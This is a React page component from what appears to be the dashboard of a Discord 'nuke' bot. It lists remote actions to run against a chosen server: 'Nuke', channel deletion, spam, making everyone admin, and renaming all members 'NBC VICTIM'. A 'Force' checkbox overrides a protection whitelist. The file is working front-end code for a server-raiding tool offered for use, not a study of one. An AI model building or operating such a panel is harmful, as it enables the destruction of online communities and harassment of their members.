import { useEffect, useState } from 'react';
import { useParams } from 'react-router-dom';
import { Rocket, Trash2, Plus, Shield, ShieldCheck, Lock, LogOut, Loader2, RefreshCw } from 'lucide-react';
import { api } from '../../lib/api';
import { Card, Loader, Badge } from '../../components/ui';
import { useAuth } from '../../context/AuthContext';
import { nf, timeAgo } from '../../lib/format';

const ACTIONS = [
  { key: 'nuke', label: 'Nuke', icon: Rocket, tone: 'danger', args: {}, protected: true },
  { key: 'delete_channels', label: 'Delete Channels', icon: Trash2, tone: 'ghost', args: {}, protected: true },
  { key: 'create_channels', label: 'Create Channels', icon: Plus, tone: 'ghost', args: { count: 20 }, protected: false },
  { key: 'spam_all', label: 'Spam All', icon: RefreshCw, tone: 'ghost', args: { count: 3 }, protected: true },
  { key: 'admin_all', label: 'Admin Everyone', icon: Shield, tone: 'ghost', args: {}, protected: true },
  { key: 'nick_all', label: 'Nickname All', icon: RefreshCw, tone: 'ghost', args: { nick: 'NBC VICTIM' }, protected: true },
];

export default function ServerDetail() {
  const { guildId } = useParams();
  const { user } = useAuth();
  const [data, setData] = useState(null);
  const [busy, setBusy] = useState(null);
  const [toast, setToast] = useState(null);
  const [force, setForce] = useState(false);

  const load = () => api.get('/api/guilds/' + guildId).then((d) => setData(d.data)).catch(() => setData(false));
  useEffect(() => { load(); }, [guildId]);

  const run = async (action, args) => {
    setBusy(action);
    setToast(null);
    try {
      const r = action === 'leave'
        ? await api.post('/api/guilds/' + guildId + '/leave')
        : await api.post('/api/guilds/' + guildId + '/execute', { action, args, force });

      setToast({ ok: true, msg: action + ' queued (' + r.jobId + ')' });
      setTimeout(load, 4000);
    } catch (e) {
      if (e.status === 409) {
        setToast({ ok: false, msg: 'Ye server protected hai. "Force" tick karke dobara dabao.' });
      } else {
        setToast({ ok: false, msg: e.message });
      }
    } finally {
      setBusy(null);
    }
  };

  const toggleWhitelist = async () => {
    try {
      if (isProtected) await api.delete('/api/guilds/' + guildId + '/whitelist');
      else await api.post('/api/guilds/' + guildId + '/whitelist');
      setToast({ ok: true, msg: isProtected ? 'Protection hata di' : 'Server protect ho gaya' });
      setForce(false);
      load();
    } catch (e) {
      setToast({ ok: false, msg: e.message });
    }
  };

  if (data === null) return <Loader />;
  if (data === false) return <p className="text-muted">Server not found.</p>;

  const isProtected = Boolean(data.protected || data.isWhitelisted || data.live?.whitelisted);

  return (
    <div className="space-y-6">
      <div className="flex flex-wrap items-center gap-4">
        <div className="h-16 w-16 overflow-hidden rounded-2xl border border-edge bg-surface">
          {data.icon && <img src={data.icon} alt="" className="h-full w-full object-cover" />}
        </div>
        <div className="flex-1">
          <h1 className="font-display text-2xl font-bold">{data.name}</h1>
          <p className="text-sm text-muted">
            {nf(data.memberCount)} members - {nf(data.channelCount)} channels - ID {data.guildId}
          </p>
        </div>
        {isProtected && <Badge tone="green"><ShieldCheck size={12} className="mr-1" />Protected</Badge>}
        {data.live && <Badge tone="purple">Live</Badge>}
      </div>

      {isProtected && (
        <div className="card flex flex-wrap items-center gap-3 border-amber-500/30 bg-amber-500/[0.06] p-4 text-sm text-amber-200">
          <Lock size={16} />
          <span>Ye server protected hai. Nuke / delete actions block rahenge.</span>
          <label className="ml-auto flex items-center gap-2 font-medium">
            <input type="checkbox" checked={force} onChange={(e) => setForce(e.target.checked)} />
            Force
          </label>
        </div>
      )}

      {toast && (
        <div className={'card p-3 text-sm ' + (toast.ok ? 'text-emerald-300' : 'text-red-300')}>{toast.msg}</div>
      )}

      <Card>
        <h2 className="font-display font-semibold">Remote Actions</h2>
        <p className="mt-1 text-xs text-muted">Only global admins can execute.</p>
        <div className="mt-4 grid gap-2.5 sm:grid-cols-3">
          {ACTIONS.map((a) => {
            const locked = isProtected && a.protected && !force;
            return (
              <button
                key={a.key}
                disabled={busy || !user.isAdmin}
                onClick={() => run(a.key, a.args)}
                title={locked ? 'Protected server — Force tick karo' : undefined}
                className={(a.tone === 'danger' ? 'btn-danger' : 'btn-ghost') + ' justify-start ' + (locked ? 'opacity-60' : '')}
              >
                {busy === a.key ? <Loader2 size={16} className="animate-spin" /> : <a.icon size={16} />}
                {a.label}
                {locked && <Lock size={12} className="ml-auto text-amber-300" />}
              </button>
            );
          })}
        </div>

        <div className="mt-4 flex flex-wrap gap-2.5 border-t border-edge pt-4">
          <button onClick={toggleWhitelist} disabled={!user.isAdmin} className="btn-ghost">
            <Shield size={16} /> {isProtected ? 'Unprotect' : 'Protect from nuke'}
          </button>
          <button onClick={() => run('leave', {})} disabled={!user.isOwner} className="btn-ghost">
            <LogOut size={16} /> Make bot leave
          </button>
        </div>
      </Card>

      <Card>
        <h2 className="font-display font-semibold">Recent Actions</h2>
        <div className="mt-3 space-y-2">
          {(data.actions || []).map((a) => (
            <div key={a._id} className="flex items-center justify-between rounded-xl border border-edge bg-surface/40 p-3 text-sm">
              <span className="font-medium">{a.action}</span>
              <div className="flex items-center gap-3">
                <span className="text-xs text-muted">{a.requestedByName} - {timeAgo(a.createdAt)}</span>
                <Badge tone={a.status === 'done' ? 'green' : a.status === 'failed' ? 'red' : 'amber'}>{a.status}</Badge>
              </div>
            </div>
          ))}
          {(!data.actions || data.actions.length === 0) && <p className="text-sm text-muted">No actions yet.</p>}
        </div>
      </Card>
    </div>
  );
}
